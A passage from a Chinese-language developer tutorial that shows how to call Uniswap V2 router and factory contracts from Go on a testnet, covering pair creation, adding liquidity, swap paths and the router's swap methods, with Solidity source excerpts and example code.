class="hljs-number">50</span>:<span class="hljs-number">58</span> amountint=<span class="hljs-number">33433745682</span><br><span class="hljs-number">2025</span>/<span class="hljs-number">06</span>/<span class="hljs-number">12</span> <span class="hljs-number">21</span>:<span class="hljs-number">50</span>:<span class="hljs-number">59</span> amountOut=<span class="hljs-number">29907018270278</span><br><span class="hljs-number">2025</span>/<span class="hljs-number">06</span>/<span class="hljs-number">12</span> <span class="hljs-number">21</span>:<span class="hljs-number">50</span>:<span class="hljs-number">59</span> amountsIn USDC =<span class="hljs-number">1</span><br><span class="hljs-number">2025</span>/<span class="hljs-number">06</span>/<span class="hljs-number">12</span> <span class="hljs-number">21</span>:<span class="hljs-number">50</span>:<span class="hljs-number">59</span> amountsIn WETH =<span class="hljs-number">6211</span><br><span class="hljs-number">2025</span>/<span class="hljs-number">06</span>/<span class="hljs-number">12</span> <span class="hljs-number">21</span>:<span class="hljs-number">50</span>:<span class="hljs-number">59</span> amountsIn BTC =<span class="hljs-number">1000000000000</span><br><span class="hljs-number">2025</span>/<span class="hljs-number">06</span>/<span class="hljs-number">12</span> <span class="hljs-number">21</span>:<span class="hljs-number">50</span>:<span class="hljs-number">59</span> amountsOut USDC =<span class="hljs-number">1000000000000</span><br><span class="hljs-number">2025</span>/<span class="hljs-number">06</span>/<span class="hljs-number">12</span> <span class="hljs-number">21</span>:<span class="hljs-number">50</span>:<span class="hljs-number">59</span> amountsOut WETH =<span class="hljs-number">14138269893380246</span><br><span class="hljs-number">2025</span>/<span class="hljs-number">06</span>/<span class="hljs-number">12</span> <span class="hljs-number">21</span>:<span class="hljs-number">50</span>:<span class="hljs-number">59</span> amountsOut BTC =<span class="hljs-number">2236640707169690577419326</span><br>--- PASS: TestGetAmount (<span class="hljs-number">2.12</span>s)<br>PASS<br></code></pre></td></tr></table></figure><p>可以看到，这个时候我们已经通过调用链上的合约通过输入对应金额的方法来获取到了我们对应的回来的金额</p><p>看到了01:03:05</p><h1 id="3-创建币对"><a href="#3-创建币对" class="headerlink" title="3 创建币对"></a>3 创建币对</h1><p>创建币对交易池有两种方式，</p><p>一种是通过路由合约创建，</p><p>另一种是通过工厂合约创建，</p><h2 id="路由合约创建"><a href="#路由合约创建" class="headerlink" title="路由合约创建"></a>路由合约创建</h2><p>路由合约创建的底层还是调用了工厂合约的创建方法</p><p>路由合约创建币对池子源码———addLiquidity，如果没有对应的币对合约就创建一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function addLiquidity(<br>    address tokenA,<br>    address tokenB,<br>    uint amountADesired,<br>    uint amountBDesired,<br>    uint amountAMin,<br>    uint amountBMin,<br>    address to,<br>    uint deadline<br>) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) &#123;<br>    (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);<br>    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);// 这里<br>    // NOTE: trasfer of tokens before mint<br>    TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);<br>    TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);<br>    liquidity = IUniswapV2Pair(pair).mint(to);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="工厂合约创建币对源码"><a href="#工厂合约创建币对源码" class="headerlink" title="工厂合约创建币对源码"></a>工厂合约创建币对源码</h2><p>通过传入token A 和 token B两个地约地址，进行哈希后生成盐值再经过汇编生成对应的币对地址再创建币对合约</p><p>这里有个小细节，关于两个token谁在前面 是通过对比大小而来的，</p><blockquote><p>[!IMPORTANT]</p><p>这里可以留意一下，后面可能会用到，比如说后面查询某个币对池的时候，可以先行判断两个代币的大小后来预先知道哪个是WETH哪个是MeMe币</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function createPair(address tokenA, address tokenB) external returns (address pair) &#123;<br>    require(tokenA != tokenB, &#x27;UniswapV2: IDENTICAL_ADDRESSES&#x27;);<br>    // NOTE: sort tokens by address<br>    // address &lt;-&gt; 20 bytes hexadecimal &lt;-&gt; 160 bit number<br>    // 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97 &lt;-&gt; 412311598482915581890913355723629879470649597847<br>    // address(1), address(2)<br>    (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);<br>    require(token0 != address(0), &#x27;UniswapV2: ZERO_ADDRESS&#x27;);<br>    require(getPair[token0][token1] == address(0), &#x27;UniswapV2: PAIR_EXISTS&#x27;); // single check is sufficient<br>    // NOTE: creation code = runtime code + constructor args<br>    bytes memory bytecode = type(UniswapV2Pair).creationCode;<br>    // NOTE: deploy with create2 - UniswapV2Library.pairFor<br>    // NOTE: create2 addr &lt;- keccak256(creation bytecode) &lt;- constructor args<br>    // create2 addr = keccak256(0xff, deployer, salt, keccak256(creation bytecode))<br>    bytes32 salt = keccak256(abi.encodePacked(token0, token1));<br>    assembly &#123;<br>        // NOTE: pair = address(new UniswapV2Pair&#123;salt: salt&#125;());<br>        pair := create2(0, add(bytecode, 32), mload(bytecode), salt)<br>    &#125;<br>    // NOTE: call initialize to initialize contract without constructor args<br>    IUniswapV2Pair(pair).initialize(token0, token1);<br>    getPair[token0][token1] = pair;<br>    getPair[token1][token0] = pair; // populate mapping in the reverse direction<br>    allPairs.push(pair);<br>    emit PairCreated(token0, token1, pair, allPairs.length);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过go语言调用合约方法创建币对</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CreatePair</span><span class="hljs-params">()</span></span> &#123;<br>factoryInstance := getFactory()<br>aunt := getAuth()<br><span class="hljs-comment">// CreatePair(opts *bind.TransactOpts, tokenA common.Address, tokenB common.Address) (*types.Transaction, error)</span><br>WETH := common.HexToAddress(<span class="hljs-string">&quot;0x9EDCde0257F2386Ce177C3a7FCdd97787F0D841d&quot;</span>)<br>USDT := common.HexToAddress(<span class="hljs-string">&quot;0x58278ebb4EbFA82ebF183E4CdEc1968391e59b6C&quot;</span>)<br><br>tx, err := factoryInstance.CreatePair(aunt, WETH, USDT)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Failed to create transactor: %v\n&quot;</span>, err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;Mint tx sent: https://sepolia.abscan.org/tx/%s\n&quot;</span>, tx.Hash().Hex())<br><br>&#125;<br></code></pre></td></tr></table></figure><p>币对合约地址：<a href="https://sepolia.abscan.org/token/0x5c1080c5180aa87688d4064facbf7a4520bf2339">https://sepolia.abscan.org/token/0x5c1080c5180aa87688d4064facbf7a4520bf2339</a></p><p>路由合约地址：<a href="https://sepolia.abscan.org/address/0x96ff7d9dbf52fdcae79157d3b249282c7fabd409">https://sepolia.abscan.org/address/0x96ff7d9dbf52fdcae79157d3b249282c7fabd409</a></p><p>工厂合约地址：<a href="https://sepolia.abscan.org/address/0x566d7510dee58360a64c9827257cf6d0dc43985e">https://sepolia.abscan.org/address/0x566d7510dee58360a64c9827257cf6d0dc43985e</a></p><p>USDT 合约我们自己的：<a href="https://sepolia.abscan.org/token/0x58278ebb4EbFA82ebF183E4CdEc1968391e59b6C">https://sepolia.abscan.org/token/0x58278ebb4EbFA82ebF183E4CdEc1968391e59b6C</a></p><h1 id="4、添加流动性"><a href="#4、添加流动性" class="headerlink" title="4、添加流动性"></a>4、添加流动性</h1><p>同上 ，添加流动性可以通过调用路由合约的addLiquidity addLiquidityETH</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">AddLiquidityETH</span><span class="hljs-params">()</span></span> &#123;<br>deadline := big.NewInt(time.Now().Add(<span class="hljs-number">1</span> * time.Minute).Unix())<br><span class="hljs-comment">//client.</span><br>routerInstance := getRouter()<br>auth := getAuth()<br><span class="hljs-comment">//WETH := common.HexToAddress(&quot;0x9EDCde0257F2386Ce177C3a7FCdd97787F0D841d&quot;)</span><br>USDT := common.HexToAddress(<span class="hljs-string">&quot;0x58278ebb4EbFA82ebF183E4CdEc1968391e59b6C&quot;</span>)<br>routerAddress := common.HexToAddress(<span class="hljs-string">&quot;0x96ff7D9dbf52FdcAe79157d3b249282c7FABd409&quot;</span>)<br><span class="hljs-comment">//path := []common.Address&#123;WETH, targetTokenAddress&#125;</span><br><br>amountTokenDesired := <span class="hljs-built_in">new</span>(big.Int).Mul(big.NewInt(<span class="hljs-number">1000</span>), big.NewInt(<span class="hljs-number">1e18</span>)) <span class="hljs-comment">// 1 // 想添加 1000 个代币</span><br>amountTokenMin := <span class="hljs-built_in">new</span>(big.Int).Mul(big.NewInt(<span class="hljs-number">900</span>), big.NewInt(<span class="hljs-number">1e18</span>))      <span class="hljs-comment">//  最少接受 900 个代币，滑点保护</span><br>amountETHMin := <span class="hljs-built_in">new</span>(big.Int).Mul(big.NewInt(<span class="hljs-number">1</span>), big.NewInt(<span class="hljs-number">1e17</span>))          <span class="hljs-comment">// 最少接受 0.1 个 ETH，滑点保护</span><br><span class="hljs-comment">// 先approve Router合约转出代币</span><br>usdtInstance := getUsdt()<br>txApprove, err := usdtInstance.Approve(auth, routerAddress, amountTokenDesired)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;txApprove failed: %v&quot;</span>, err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;txApprove tx sent: https://sepolia.abscan.org/tx/%s\n&quot;</span>, txApprove.Hash().Hex())<br><br><span class="hljs-comment">// 等待交易确认（示例用sleep，实际建议用事件监听）</span><br>time.Sleep(<span class="hljs-number">5</span> * time.Second)<br>auth.Value = amountETHMin<br><span class="hljs-comment">//AddLiquidityETH(opts *bind.TransactOpts, token common.Address, amountTokenDesired *big.Int, amountTokenMin *big.Int, amountETHMin *big.Int, to common.Address, deadline *big.Int) (*types.Transaction, error)</span><br>tx, err := routerInstance.AddLiquidityETH(<br>auth,<br>USDT,<br>amountTokenDesired,<br>amountTokenMin,<br>amountETHMin,<br>auth.From,<br>deadline,<br>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;AddLiquidityETH failed: %v&quot;</span>, err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;AddLiquidityETH tx sent: https://sepolia.abscan.org/tx/%s\n&quot;</span>, tx.Hash().Hex())<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="5、减少流动性"><a href="#5、减少流动性" class="headerlink" title="5、减少流动性"></a>5、减少流动性</h1><p>同上 ，减少流动性可以通过调用路由合约的removeLiquidity removeLiquidityETH</p><p>不做演示了</p><h1 id="6、swap换币"><a href="#6、swap换币" class="headerlink" title="6、swap换币"></a>6、swap换币</h1><h2 id="第一种方式，Uniswap-V2-Router-合约-Swap-方法"><a href="#第一种方式，Uniswap-V2-Router-合约-Swap-方法" class="headerlink" title="第一种方式，Uniswap V2 Router 合约 Swap 方法"></a>第一种方式，Uniswap V2 Router 合约 Swap 方法</h2><p>Uniswap V2 Router 合约提供了多种 swap 相关方法，常见的有：</p><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>SwapExactTokensForTokens</code></td><td>用固定数量的输入代币，换取尽可能多的输出代币</td></tr><tr><td><code>SwapTokensForExactTokens</code></td><td>用尽可能少的输入代币，换取固定数量的输出代币</td></tr><tr><td><code>SwapExactETHForTokens</code></td><td>用固定数量的 ETH，换取尽可能多的代币</td></tr><tr><td><code>SwapTokensForExactETH</code></td><td>用尽可能少的代币，换取固定数量的 ETH</td></tr><tr><td><code>SwapExactTokensForETH</code></td><td>用固定数量的代币，换取尽可能多的 ETH</td></tr><tr><td><code>SwapETHForExactTokens</code></td><td>用尽可能少的 ETH，换取固定数量的代币</td></tr></tbody></table><h3 id="典型调用示例（SwapExactTokensForTokens）"><a href="#典型调用示例（SwapExactTokensForTokens）" class="headerlink" title="典型调用示例（SwapExactTokensForTokens）"></a>典型调用示例（SwapExactTokensForTokens）</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go">tx, err := routerInstance.SwapExactTokensForTokens(<br>    auth,              <span class="hljs-comment">// *bind.TransactOpts，包含签名者信息</span><br>    amountIn,          <span class="hljs-comment">// 输入代币数量 *big.Int</span><br>    amountOutMin,      <span class="hljs-comment">// 最小输出代币数量 *big.Int</span><br>    path,              <span class="hljs-comment">// 兑换路径 []common.Address，比如 [tokenA, tokenB]</span><br>    to,                <span class="hljs-comment">// 接收地址 common.Address</span><br>    deadline,          <span class="hljs-comment">// 截止时间 uint64 或 *big.Int，unix时间戳</span><br>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    log.Fatal(err)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;Swap tx sent:&quot;</span>, tx.Hash().Hex())<br></code></pre></td></tr></table></figure><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><ul><li><code>auth</code>：交易签名者，使用 <code>bind.NewKeyedTransactor(privateKey)</code> 创建</li><li><code>amountIn</code>：输入代币数量（要先 Approve 路由合约花费你的代币）</li><li><code>amountOutMin</code>：最小接受的输出代币数量，防止滑点</li><li><code>path</code>：兑换路径，数组，第一个是输入代币地址，最后一个是输出代币地址，中间是中间代币（比如 WETH）</li><li><code>to</code>：接收代币地址，通常是你的钱包地址</li><li><code>deadline</code>：交易截止时间，unix 时间戳，防止交易长时间挂起</li></ul><h3 id="什么是-path？"><a href="#什么是-path？" class="headerlink" title="什么是 path？"></a>什么是 <code>path</code>？</h3><ul><li><code>path</code> 是一个 <code>[]common.Address</code> 类型的数组（Go 里），代表了兑换路径（swap 路径）。</li><li>每个地址都是一个代币合约地址。</li><li>路径定义了交易过程中代币如何一步步兑换。</li></ul><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>Uniswap V2 的交易是基于<strong>流动性池（Pair）</strong>的，每个池只包含一对代币，比如 <code>TokenA</code> 和 <code>TokenB</code>。</p><p>如果你要直接从 <code>TokenA</code> 兑换 <code>TokenB</code>，且存在 <code>TokenA-TokenB</code> 的流动池，路径就是：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">path := []common.Address&#123;TokenAAddress, TokenBAddress&#125;<br></code></pre></td></tr></table></figure><p>如果没有直接的流动池，比如你想从 <code>TokenA</code> 换成 <code>TokenC</code>，但没有 <code>TokenA-TokenC</code> 池，而有 <code>TokenA-WETH</code> 和 <code>WETH-TokenC</code> 两个池，那么路径就是：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">path := []common.Address&#123;TokenAAddress, WETHAddress, TokenCAddress&#125;<br></code></pre></td></tr></table></figure><h3 id="路径示意"><a href="#路径示意" class="headerlink" title="路径示意"></a>路径示意</h3><ul><li><p>交易按照路径依次进行：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">TokenA -&gt; WETH -&gt; TokenC<br></code></pre></td></tr></table></figure></li><li><p>路由合约会先用 <code>TokenA</code> 换 <code>WETH</code>，再用 <code>WETH</code> 换 <code>TokenC</code></p></li></ul><h3 id="典型路径示例"><a href="#典型路径示例" class="headerlink" title="典型路径示例"></a>典型路径示例</h3><table><thead><tr><th>需求</th><th>路径示例</th></tr></thead><tbody><tr><td>直接换代币</td><td><code>[TokenA, TokenB]</code></td></tr><tr><td>通过 WETH 中转</td><td><code>[TokenA, WETH, TokenB]</code></td></tr><tr><td>多步中转</td><td><code>[TokenA, WETH, TokenX, TokenB]</code></td></tr></tbody></table><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// SwapTokenOnRouter 在我创建的币对合约做swap ，两种方式，这里是第一种，通过路由合约</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SwapTokenOnRouter</span><span class="hljs-params">()</span></span> &#123;<br>deadline := big.NewInt(time.Now().Add(<span class="hljs-number">5</span> * time.Minute).Unix()) <span class="hljs-comment">// 最多等待时间</span><br><span class="hljs-comment">// 1、拿路由合约go对象</span><br>routerInstance := getRouter()<br><span class="hljs-comment">//routerAddress := common.HexToAddress(&quot;0x96ff7D9dbf52FdcAe79157d3b249282c7FABd409&quot;)</span><br><span class="hljs-comment">//usdtInstance := getUsdt()</span><br><span class="hljs-comment">// 2、auth ,如果是</span><br>auth := getAuth()<br><span class="hljs-comment">// 3、path：如果只是ETH还Token的话，path只需要WETH和token即可</span><br>USDT := common.HexToAddress(<span class="hljs-string">&quot;0x58278ebb4EbFA82ebF183E4CdEc1968391e59b6C&quot;</span>)<br>WETH := common.HexToAddress(<span class="hljs-string">&quot;0x9EDCde0257F2386Ce177C3a7FCdd97787F0D841d&quot;</span>)<br><span class="hljs-comment">//BTC := common.HexToAddress(&quot;0x216683565fbE6F3d365Ae5D73BE1549216989ff6&quot;)</span><br><span class="hljs-comment">// 核心，路由合约Swap方法</span><br><span class="hljs-comment">//Uniswap V2 Router 合约常用 Swap 方法</span><br><span class="hljs-comment">//Uniswap V2 Router 合约提供了多种 swap 相关方法，常见的有：</span><br><span class="hljs-comment">//方法名说明</span><br><br><span class="hljs-comment">//* SwapExactETHForTokens用固定数量的 ETH，换取尽可能多的代币，这个就简单了，最小输出金额固定，这里的path只需要2个</span><br>path := []common.Address&#123;WETH, USDT&#125;                                   <span class="hljs-comment">// path 里面只有USDT ,我们只做ETH==&gt;WETH==&gt;USDT</span><br>amountOutMin := <span class="hljs-built_in">new</span>(big.Int).Mul(big.NewInt(<span class="hljs-number">1</span>), big.NewInt(<span class="hljs-number">1e18</span>))      <span class="hljs-comment">// 1  固定数量的输出代币,就是你要得到多少个金额，至于要付出的ETH,程序会自动算出并支付</span><br>amountsIn, err := routerInstance.GetAmountsIn(<span class="hljs-literal">nil</span>, amountOutMin, path) <span class="hljs-comment">//先询价看看要付多少eth</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;GetAmountsIn failed: %v&quot;</span>, err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;amountsIn WETH=%d\n&quot;</span>, amountsIn[<span class="hljs-number">0</span>])   <span class="hljs-comment">// amountsIn WETH=100200989823115</span><br>fmt.Printf(<span class="hljs-string">&quot;amountsOut USDT =%d\n&quot;</span>, amountsIn[<span class="hljs-number">1</span>]) <span class="hljs-comment">//amountsOut USDT =1000000000000000000</span><br><span class="hljs-comment">//  设置auth.Value = 需要支付的ETH数量</span><br>requiredETH := amountsIn[<span class="hljs-number">0</span>] <span class="hljs-comment">// 需要输入多少WETH，即ETH数量</span><br>auth.Value = requiredETH    <span class="hljs-comment">// 这里因为要付ETH ,所以把auth者的金额设置一下，表示要支付的eth,可以比询价的结果高，不可以低</span><br><span class="hljs-comment">//源码 SwapExactETHForTokens(opts *bind.TransactOpts, amountOutMin *big.Int, path []common.Address, to common.Address, deadline *big.Int)</span><br>tx, err := routerInstance.SwapExactETHForTokens(auth, amountOutMin, path, auth.From, deadline)<br><span class="hljs-comment">// 结果：Swap tx sent: https://sepolia.abscan.org/tx/0xfacbe55c3dc87b1aeeb08a997b99edab5777c927abe4962847160bf2b68bf36c</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;SwapExactETHForTokens err: %v&quot;</span>, err)<br>&#125;<br><br><span class="hljs-comment">//* SwapETHForExactTokens用尽可能少的 ETH，换取固定数量的代币，</span><br><span class="hljs-comment">//path := []common.Address&#123;WETH, USDT&#125;                             // path 里面只有USDT和WETH ,我们只做 ETH==&gt;WETH==&gt;USDT</span><br><span class="hljs-comment">//amountOut := new(big.Int).Mul(big.NewInt(100), big.NewInt(1e18)) // 1 固定输出代币</span><br><span class="hljs-comment">// 先询价，看看我们要得到这个多的代币需要支付多少eth GetAmountsIn:固定得到数来预测付出数</span><br><span class="hljs-comment">//amountsIn, err := routerInstance.GetAmountsIn(&amp;bind.CallOpts&#123;&#125;, amountOut, path)</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//log.Fatalf(&quot;GetAmountsIn err: %v&quot;, err)</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//fmt.Printf(&quot;amountsIn WETH=%d\n&quot;, amountsIn[0])  // amountsIn WETH=10642318845770104 也就是说最少要付0.0106这么多eth</span><br><span class="hljs-comment">//fmt.Printf(&quot;amountsOut USDT=%d\n&quot;, amountsIn[1]) // amountsOut USDT=amountOut=100000000000000000000</span><br><span class="hljs-comment">// 这里要付eth，所以要设置auth.Value来确定支付</span><br><span class="hljs-comment">//amountETH := new(big.Int).Mul(big.NewInt(1), big.NewInt(1e17)) // 1 设置最大支付的ETH:0.1ETH,0.1&gt;0.0106</span><br><span class="hljs-comment">//auth.Value = amountETH</span><br><span class="hljs-comment">//SwapETHForExactTokens(opts *bind.TransactOpts, amountOut *big.Int, path []common.Address, to common.Address, deadline *big.Int)</span><br><span class="hljs-comment">//tx, err := routerInstance.SwapETHForExactTokens(auth, amountOut, path, auth.From, deadline)</span><br><span class="hljs-comment">// 交易结果Swap tx sent: https://sepolia.abscan.org/tx/0x9959ddaece35cc5566e65dcf15d9cf76d09617c5260b1776bae39a65f69475a7</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//log.Fatalf(&quot;SwapETHForExactTokens err: %v&quot;, err)</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-comment">//* SwapTokensForExactETH用尽可能少的代币，换取固定数量的 ETH</span><br><span class="hljs-comment">//amountOut := new(big.Int).Mul(big.NewInt(1), big.NewInt(1e15)) // 1  固定输出的代币数量，就是你要买固定的ETH数量 0.001</span><br><span class="hljs-comment">//path := []common.Address&#123;USDT, WETH&#125;                           // path 里面只有USDT和WETH ,我们只做 USDT==&gt;WETH==&gt;ETH</span><br><span class="hljs-comment">// 可以先询价,通过GetAmountsIn来提前知道你最小要支付的数量，然后你最大支付的金额比最小的大就行</span><br><span class="hljs-comment">//amountsIn, err := routerInstance.GetAmountsIn(nil, amountOut, path) //先询价看看要付多少USDT</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//log.Fatalf(&quot;GetAmountsIn err: %v&quot;, err)</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//fmt.Printf(&quot;amountsIn USDT=%d\n&quot;, amountsIn[0])   // amountsIn USDT=10131344150178329676</span><br><span class="hljs-comment">//fmt.Printf(&quot;amountsOut WETH =%d\n&quot;, amountsIn[1]) //amountsOut WETH =1000000000000000</span><br><span class="hljs-comment">// 通过询价发现，我们要付至少10个usdt 才能换到0.001 个ETH</span><br><span class="hljs-comment">//amountInMax := new(big.Int).Mul(big.NewInt(11), big.NewInt(1e18)) // 2  最大输入代币，就是你最多付多少，最多付12个</span><br><span class="hljs-comment">// SwapTokensForExactETH(opts *bind.TransactOpts, amountOut *big.Int, amountInMax *big.Int, path []common.Address, to common.Address, deadline *big.Int)</span><br><span class="hljs-comment">//tx, err := routerInstance.SwapTokensForExactETH(auth, amountOut, amountInMax, path, auth.From, deadline)</span><br><span class="hljs-comment">// 交易结果 Swap tx sent: https://sepolia.abscan.org/tx/0x3307f7d4d7762d239f105cb6b206aa10375fbccc12042f40b228e63387e6a215</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//log.Fatalf(&quot;SwapTokensForExactETH err: %v&quot;, err)</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-comment">//* SwapExactTokensForETH用固定数量的代币，换取尽可能多的 ETH</span><br><span class="hljs-comment">//path := []common.Address&#123;USDT, WETH&#125;                              // path 里面只有USDT和WETH ,我们只做 USDT==&gt;WETH==&gt;ETH</span><br><span class="hljs-comment">//amountIn := new(big.Int).Mul(big.NewInt(12), big.NewInt(1e18))    // 1  